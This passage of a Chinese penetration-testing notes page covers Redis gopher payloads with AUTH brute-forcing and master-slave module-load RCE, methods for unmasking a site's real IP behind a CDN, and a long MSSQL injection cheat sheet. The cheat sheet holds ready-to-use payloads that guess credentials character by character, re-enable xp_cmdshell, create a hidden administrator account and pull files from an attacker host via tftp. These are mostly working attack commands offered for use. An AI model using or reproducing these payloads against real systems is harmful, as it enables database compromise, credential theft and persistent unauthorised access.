    cmd+&#x3D;CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)
  cmd+&#x3D;CRLF
  return cmd

if __name__&#x3D;&#x3D;&quot;__main__&quot;:
  for x in cmd:
    payload +&#x3D; urllib.quote(redis_format(x))
  print payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102181438636-1255491191.png"></p>
<p>redis如果有密码，是弱口令的话，可以通过python脚本爆破，看回显来确定密码是否正确</p>
<p>如果有口令在最前面，和gopher的格式一样，如下健为AUTH，密码为123456</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102181808754-1675763347.png"></p>
<p>爆破的时候需要在寻常的未授权前加上认证的gopher字段</p>
<pre class="line-numbers language-none"><code class="language-none">%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123456%0D%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>爆破成功的化可以直接结合gopher协议对redis进行写shell的操作。</p>
<p>这里结合上面的redis主从复制的RCE来执行命令，先来构造加载exp.so的payload</p>
<pre class="line-numbers language-none"><code class="language-none">config set dir &#x2F;tmp&#x2F;
config set dbfilename &#x2F;tmp&#x2F;
slaveof 192.168.127.140 4444
module load &#x2F;tmp&#x2F;exp.so
system.exec &#39;whoami&#39;
quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102182908032-751922075.png"></p>
<p>这样就可以加载本地的exp.so对redis进行爆破，如果爆破成功就执行whoami命令。</p>
<p>这里只是一种演示，使用此方法同样可以写shell，写计划任务来获取shell。</p>
<p><strong>相关文章</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p>
<h2 id="15-如何反查真实ip"><a href="#15-如何反查真实ip" class="headerlink" title="15.如何反查真实ip"></a>15.如何反查真实ip</h2><h4 id="11种绕过CDN查找真是IP方法"><a href="#11种绕过CDN查找真是IP方法" class="headerlink" title="11种绕过CDN查找真是IP方法"></a><strong>11种绕过CDN查找真是IP方法</strong></h4><h3 id="0x01-验证是否存在CDN"><a href="#0x01-验证是否存在CDN" class="headerlink" title="0x01 验证是否存在CDN"></a>0x01 验证是否存在CDN</h3><hr>
<h4 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h4><p>很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br> <a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br> <a target="_blank" rel="noopener" href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br> <a target="_blank" rel="noopener" href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p>
<h4 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h4><p>使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p>
<blockquote>
<p> <a target="_blank" rel="noopener" href="http://www.163.com/">www.163.com</a><br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p>
<p>非权威应答:<br> 名称:    163.xdwscache.ourglb0.com<br> Addresses:  58.223.164.86</p>
<p>​          125.75.32.252<br> Aliases:  <a target="_blank" rel="noopener" href="http://www.163.com/">www.163.com</a></p>
<p>​          <a target="_blank" rel="noopener" href="http://www.163.com.lxdns.com/">www.163.com.lxdns.com</a></p>
</blockquote>
<p>无 CDN 的示例：</p>
<blockquote>
<p> xiaix.me<br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p>
<p>非权威应答:<br> 名称:    xiaix.me<br> Address:  192.3.168.172  </p>
</blockquote>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="0x02-绕过-CDN-查找网站真实-IP"><a href="#0x02-绕过-CDN-查找网站真实-IP" class="headerlink" title="0x02 绕过 CDN 查找网站真实 IP"></a>0x02 绕过 CDN 查找网站真实 IP</h3><h4 id="方法1-查询历史DNS记录"><a href="#方法1-查询历史DNS记录" class="headerlink" title="方法1:查询历史DNS记录"></a>方法1:查询历史DNS记录</h4><p>1）查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br> <a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a>     ###DNS查询<br> <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>    ###微步在线<br> <a target="_blank" rel="noopener" href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a>    ###在线域名信息查询<br> <a target="_blank" rel="noopener" href="http://viewdns.info/">http://viewdns.info/</a>        ###DNS、IP等查询<br> <a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a>  ###CDN查询IP</p>
<p>2）利用<a target="_blank" rel="noopener" href="https://securitytrails.com/">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</p>
<p>如何寻找隐藏在CloudFlare或TOR背后的真实原始IP</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009230838766-860479177.png"></p>
<p>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</p>
<h3 id="方法2-查询子域名"><a href="#方法2-查询子域名" class="headerlink" title="方法2:查询子域名"></a>方法2:查询子域名</h3><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p>
<p>下面介绍些常用的子域名查找的方法和工具：</p>
<p>1）微步在线(<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>)</p>
<p>上文提到的微步在线功能强大，黑客只需输入要查找的域名(如baidu.com)，点击子域名选项就可以查找它的子域名了，但是免费用户每月只有5次免费查询机会。如图：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009230922994-1826758810.png"></p>
<p>2）Dnsdb查询法。(<a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a>)</p>
<p>黑客只需输入baidu.com type:A就能收集百度的子域名和ip了。如图：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009230938207-1237434919.png"></p>
<p>3）Google 搜索</p>
<p>Google site:baidu.com -www就能查看除www外的子域名，如图：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009230948312-1656865036.png"></p>
<p>4）各种子域名扫描器</p>
<p>这里，主要为大家推荐子域名挖掘机和lijiejie的subdomainbrute(<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a>)</p>
<p>子域名挖掘机仅需输入域名即可基于字典挖掘它的子域名，如图：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231018377-2070670991.png"></p>
<p>Subdomainbrute以windows为例，黑客仅需打开cmd进入它所在的目录输入Python subdomainbrute.py baidu.com –full即可收集百度的子域名，如图：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231030794-1664451845.png"></p>
<h3 id="方法3：网络空间引擎搜索法"><a href="#方法3：网络空间引擎搜索法" class="headerlink" title="方法3：网络空间引擎搜索法"></a>方法3：网络空间引擎搜索法</h3><p>常见的有以前的钟馗之眼，<a target="_blank" rel="noopener" href="https://www.shodan.io/">shodan</a>，<a target="_blank" rel="noopener" href="https://fofa.so/">fofa搜索</a>。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip，如图：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231044976-1731199101.png"></p>
<h3 id="方法4-利用SSL证书寻找真实原始IP"><a href="#方法4-利用SSL证书寻找真实原始IP" class="headerlink" title="方法4:利用SSL证书寻找真实原始IP"></a>方法4:利用SSL证书寻找真实原始IP</h3><p>使用给定的域名</p>
<p>假如你在xyz123boot.com上托管了一个服务，原始服务器IP是136.23.63.44。  而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443（<a href="https://136.23.63.44:443）上直接连接到IP时，SSL证书就会被暴露。">https://136.23.63.44:443）上直接连接到IP时，SSL证书就会被暴露。</a></p>
<p>此时，如果攻击者扫描0.0.0.0&#x2F;0，即整个互联网，他们就可以在端口443上获取在xyz123boot.com上的有效证书，进而获取提供给你的Web服务器IP。</p>
<p>目前Censys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。Censys搜索引擎能够扫描整个互联网，Censys每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
<p>而攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数。</p>
<p>xyz123boot.com证书的搜索查询参数为：parsed.names：xyz123boot.com</p>
<p>只显示有效证书的查询参数为：tags.raw：trusted</p>
<p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
<p>组合后的搜索参数为：parsed.names: xyz123boot.com and tags.raw: trusted</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231113472-551474696.png"></p>
<p>Censys将向你显示符合上述搜索条件的所有标准证书，以上这些证书是在扫描中找到的。</p>
<p>要逐个查看这些搜索结果，攻击者可以通过单击右侧的“Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231138538-1845210453.png"></p>
<p>此时，攻击者将看到一个使用特定证书的IPv4主机列表，而真实原始 IP就藏在其中。</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231157237-1457133495.png"></p>
<p>你可以通过导航到端口443上的IP来验证，看它是否重定向到xyz123boot.com？或它是否直接在IP上显示网站？</p>
<p>使用给定的SSL证书</p>
<p>如果你是执法部门的人员，想要找出一个隐藏在cheesecp5vaogohv.onion下的儿童色情网站。做好的办法，就是找到其原始IP，这样你就可以追踪到其托管的服务器，甚至查到背后的运营商以及金融线索。</p>
<p>隐藏服务具有SSL证书，要查找它使用的IPv4主机，只需将”SHA1 fingerprint”（签名证书的sha1值）粘贴到Censys IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器。</p>
<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="方法5-利用HTTP标头寻找真实原始IP"><a href="#方法5-利用HTTP标头寻找真实原始IP" class="headerlink" title="方法5:利用HTTP标头寻找真实原始IP"></a>方法5:利用HTTP标头寻找真实原始IP</h3><p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p>
<p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p>
<p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p>
<p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下：</p>
<p>80.http.get.headers.server:cloudflare</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231212219-1764707602.png"></p>
<h3 id="方法6-利用网站返回的内容寻找真实原始IP"><a href="#方法6-利用网站返回的内容寻找真实原始IP" class="headerlink" title="方法6:利用网站返回的内容寻找真实原始IP"></a>方法6:利用网站返回的内容寻找真实原始IP</h3><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p>
<p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
<p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p>
<p>ga（’create’，’UA-93577176-1’，’auto’）;<br> 可以使用80.http.get.body：参数通过body&#x2F;source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p>
<p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p>
<p>搜索示例：<a target="_blank" rel="noopener" href="https://www.shodan.io/search?query=http.html:UA-32023260-1">https://www.shodan.io/search?query=http.html%3AUA-32023260-1</a></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1058583-20181009231222695-1970300973.png"></p>
<h3 id="方法7-使用国外主机解析域名"><a href="#方法7-使用国外主机解析域名" class="headerlink" title="方法7:使用国外主机解析域名"></a>方法7:使用国外主机解析域名</h3><p>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p>
<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="方法8-网站漏洞查找"><a href="#方法8-网站漏洞查找" class="headerlink" title="方法8:网站漏洞查找"></a>方法8:网站漏洞查找</h3><p>1）目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。<br> 2）XSS盲打，命令执行反弹shell，SSRF等。<br> 3）无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
<h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><h3 id="方法9-网站邮件订阅查找"><a href="#方法9-网站邮件订阅查找" class="headerlink" title="方法9:网站邮件订阅查找"></a>方法9:网站邮件订阅查找</h3><p>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p>
<h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><h3 id="方法10：用-Zmap-扫全网"><a href="#方法10：用-Zmap-扫全网" class="headerlink" title="方法10：用 Zmap 扫全网"></a>方法10：用 Zmap 扫全网</h3><p>需要找 xiaix.me 网站的真实 IP，我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me。</p>
<h3 id="-5"><a href="#-5" class="headerlink" title=""></a></h3><h3 id="方法11：F5-LTM解码法"><a href="#方法11：F5-LTM解码法" class="headerlink" title="方法11：F5 LTM解码法"></a>方法11：F5 LTM解码法</h3><p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie:  BIGipServerpool_8.29_8030&#x3D;487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p>
<h2 id="16-寻找webshell"><a href="#16-寻找webshell" class="headerlink" title="16.寻找webshell"></a>16.寻找webshell</h2><p>1、抓取工具特征流量 2.日志分析  3.webshell查杀工具</p>
<h2 id="17-sql注入特征"><a href="#17-sql注入特征" class="headerlink" title="17.sql注入特征"></a>17.sql注入特征</h2><h4 id="1-判断有无注入点"><a href="#1-判断有无注入点" class="headerlink" title="1.判断有无注入点"></a>1.判断有无注入点</h4><pre class="line-numbers language-none"><code class="language-none">; and 1&#x3D;1 and 1&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="2-猜表一般的表的名称无非是admin-adminuser-user-pass-password-等…"><a href="#2-猜表一般的表的名称无非是admin-adminuser-user-pass-password-等…" class="headerlink" title="2.猜表一般的表的名称无非是admin adminuser user pass password 等…"></a>2.猜表一般的表的名称无非是admin adminuser user pass password 等…</h4><pre class="line-numbers language-none"><code class="language-none">and 0&lt;&gt;(select count(*) from *)

and 0&lt;&gt;(select count(*) from admin)     --判断是否存在admin这张表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="3-猜帐号数目"><a href="#3-猜帐号数目" class="headerlink" title="3.猜帐号数目"></a>3.猜帐号数目</h4><pre class="line-numbers language-none"><code class="language-none">如果遇到0&lt; 返回正确页面
1&lt;返回错误页面，说明帐号数目就是1个

and 0&lt;(select count(*) from admin)

and 1&lt;(select count(*) from admin)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="4-猜解字段名称-在len-括号里面加上我们想到的字段名称"><a href="#4-猜解字段名称-在len-括号里面加上我们想到的字段名称" class="headerlink" title="4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称."></a>4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.</h4><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;(select count(*) from admin where len(*)&gt;0)--

and 1&#x3D;(select count(*) from admin where len（用户字段名称name)&gt;0)

and 1&#x3D;(select count(*) from admin where len（密码字段名称password)&gt;0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="5-猜解各个字段的长度-猜解长度就是把-gt-0变换-直到返回正确页面为止"><a href="#5-猜解各个字段的长度-猜解长度就是把-gt-0变换-直到返回正确页面为止" class="headerlink" title="5.猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止"></a>5.猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止</h4><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;(select count(*) from admin where len(*)&gt;0)

and 1&#x3D;(select count(*) from admin where len(name)&gt;6)            错误

and 1&#x3D;(select count(*) from admin where len(name)&gt;5)            正确 长度是6

and 1&#x3D;(select count(*) from admin where len(name)&#x3D;6)            正确

and 1&#x3D;(select count(*) from admin where len(password)&gt;11)       正确

and 1&#x3D;(select count(*) from admin where len(password)&gt;12)       错误 长度是12

and 1&#x3D;(select count(*) from admin where len(password)&#x3D;12)       正确<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="6-猜解字符"><a href="#6-猜解字符" class="headerlink" title="6.猜解字符"></a>6.猜解字符</h4><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;(select count(*) from admin where left(name,1)&#x3D;a) ---猜解用户帐号的第一位

and 1&#x3D;(select count(*) from admin where left(name,2)&#x3D;ab)---猜解用户帐号的第二位

就这样一次加一个字符这样猜，猜到够你刚才猜出来的多少位了就对了，帐号就算出来了

and 1&#x3D;(select top 1 count(*) from Admin where Asc(mid(pass,5,1))&#x3D;51) --

这个查询语句可以猜解中文的用户和密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.

group by users. id having 1&#x3D;1--

group by users. id,users.username,users.password,users.privs having 1&#x3D;1--

; insert into users values( 666,attacker,foobar,0xffff )--

UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;logintable-

UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;logintable WHERE COLUMN_NAME NOT IN

(login_id)-

UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;logintable WHERE COLUMN_NAME NOT IN

(login_id,login_name)-

UNION SELECT TOP 1 login_name FROM logintable-

UNION SELECT TOP 1 password FROM logintable where login_name&#x3D;Rahul--

看服务器打的补丁&#x3D;出错了打了SP4补丁

and 1&#x3D;(select @@VERSION)--

看数据库连接账号的权限，返回正常，证明是服务器角色sysadmin权限。

and 1&#x3D;(SELECT IS_SRVROLEMEMBER(sysadmin))--

判断连接数据库帐号。（采用SA账号连接 返回正常&#x3D;证明了连接账号是SA）

and sa&#x3D;(SELECT System_user)--

and user_name()&#x3D;dbo--

and 0&lt;&gt;(select user_name()--

看xp_cmdshell是否删除

and 1&#x3D;(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype &#x3D; X AND name &#x3D; xp_cmdshell)--

xp_cmdshell被删除，恢复，支持绝对路径的恢复

;EXEC master.dbo.sp_addextendedproc xp_cmdshell,xplog70.dll--

;EXEC master.dbo.sp_addextendedproc xp_cmdshell,c:\inetpub\wwwroot\xplog70.dll--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="反向PING自己实验"><a href="#反向PING自己实验" class="headerlink" title="#反向PING自己实验"></a>#反向PING自己实验</h5><pre class="line-numbers language-none"><code class="language-none">;use master;declare @s int;exec sp_oacreate &quot;wscript.shell&quot;,@s out;exec sp_oamethod @s,&quot;run&quot;,NULL,&quot;cmd.exe &#x2F;c ping 192.168.0.1&quot;;--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="加帐号"><a href="#加帐号" class="headerlink" title="#加帐号"></a>#加帐号</h5><pre class="line-numbers language-none"><code class="language-none">;DECLARE @shell INT EXEC SP_OACREATEwscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C:\WINNT\system32\cmd.exe

&#x2F;c net user jiaoniang$ 1866574 &#x2F;add--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="创建一个虚拟目录E盘："><a href="#创建一个虚拟目录E盘：" class="headerlink" title="#创建一个虚拟目录E盘："></a>#创建一个虚拟目录E盘：</h5><pre class="line-numbers language-none"><code class="language-none">;declare @o int exec sp_oacreatewscript.shell,@o out exec sp_oamethod @o,run,NULL,cscript.exec:\inetpub\wwwroot\mkwebdir.vbs -w &quot;默认Web站点&quot; -v &quot;e&quot;,&quot;e：\&quot;--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="访问属性：（配合写入一个webshell）"><a href="#访问属性：（配合写入一个webshell）" class="headerlink" title="#访问属性：（配合写入一个webshell）"></a>#访问属性：（配合写入一个webshell）</h5><pre class="line-numbers language-none"><code class="language-none">declare @o int exec sp_oacreate wscript.shell,@o out exec sp_oamethod @o,run,NULL,cscript.exec:\inetpub\wwwroot\chaccess.vbs -a w3svc&#x2F;1&#x2F;ROOT&#x2F;e +browse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="爆库-特殊技巧：：-5c-x3D-或者把-x2F-和-修改-5提交"><a href="#爆库-特殊技巧：：-5c-x3D-或者把-x2F-和-修改-5提交" class="headerlink" title="#爆库 特殊技巧：：%5c&#x3D;\ 或者把&#x2F;和\ 修改%5提交"></a>#爆库 特殊技巧：：%5c&#x3D;\ 或者把&#x2F;和\ 修改%5提交</h5><pre class="line-numbers language-none"><code class="language-none">and 0&lt;&gt;(select top 1 paths from newtable)--

得到库名（从1到5都是系统的id，6以上才可以判断）

and 1&#x3D;(select name from master.dbo.sysdatabases where dbid&#x3D;7)--

and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid&#x3D;6)

依次提交 dbid &#x3D; 7,8,9.... 得到更多的数据库名

and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype&#x3D;U) 爆到一个表 假设为 admin

and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype&#x3D;U and name not in (Admin)) 来得到其他的表。

and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype&#x3D;U and name&#x3D;admin

and uid&gt;(str(id))) 爆到UID的数值假设为18779569 uid&#x3D;id

and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id&#x3D;18779569) 得到一个admin的一个字段，假设为 user_id

and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id&#x3D;18779569 and name not in

(id,...)) 来爆出其他的字段

and 0&lt;(select user_id from BBS.dbo.admin where username&gt;1) 可以得到用户名

依次可以得到密码。假设存在user_id username,password 等字段

and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid&#x3D;6)

and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype&#x3D;U) 得到表名

and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype&#x3D;U and name not in(Address))

and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype&#x3D;U and name&#x3D;admin and uid&gt;(str(id))) 判断id值

and 0&lt;&gt;(select top 1 name from BBS.dbo.syscolumns where id&#x3D;773577794) 所有字段

id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,* from admin

id&#x3D;-1 union select 1,2,3,4,5,6,7,8,*,9,10,11,12,13 from admin (union，access也好用）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="得到WEB路径"><a href="#得到WEB路径" class="headerlink" title="#得到WEB路径"></a>#得到WEB路径</h5><pre class="line-numbers language-none"><code class="language-none">;create table [dbo].[swap] ([swappass][char](255));--

and (select top 1 swappass from swap)&#x3D;1--

;CREATE TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_regread

@rootkey&#x3D;HKEY_LOCAL_MACHINE,@key&#x3D;SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\,@value_name&#x3D;&#x2F;,

values&#x3D;@testOUTPUT insert into paths(path) values(@test)--

;use ku1;--

;create table cmd (str image);-- 建立image类型的表cmd

存在xp_cmdshell的测试过程：

;exec master..xp_cmdshell dir

;exec master.dbo.sp_addlogin jiaoniang$;-- 加SQL帐号

;exec master.dbo.sp_password null,jiaoniang$,1866574;--

;exec master.dbo.sp_addsrvrolemember jiaoniang$ sysadmin;--

;exec master.dbo.xp_cmdshell net user jiaoniang$ 1866574 &#x2F;workstations:* &#x2F;times:all &#x2F;passwordchg:yes &#x2F;passwordreq:yes

&#x2F;active:yes &#x2F;add;--

;exec master.dbo.xp_cmdshell net localgroup administrators jiaoniang$ &#x2F;add;--

exec master..xp_servicecontrol start,schedule 启动服务

exec master..xp_servicecontrol start,server

; DECLARE @shell INT EXEC SP_OACREATE wscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C：\WINNT\system32

\cmd.exe &#x2F;c net user jiaoniang$ 1866574 &#x2F;add

;DECLARE @shell INT EXEC SP_OACREATE wscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C：\WINNT\system32\cmd.exe

&#x2F;c net localgroup administrators jiaoniang$ &#x2F;add

; exec master..xp_cmdshell tftp -i youip get file.exe-- 利用TFTP上传文件

;declare @a sysname set @a&#x3D;xp_+cmdshell exec @a dir c:\

;declare @a sysname set @a&#x3D;xp+_cm’+’dshell exec @a dir c:\

;declare @a;set @a&#x3D;db_name();backup database @a to disk&#x3D;你的IP你的共享目录bak.dat

如果被限制则可以

select * from openrowset(sqloledb,server;sa;,select OK! exec master.dbo.sp_addlogin hax)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

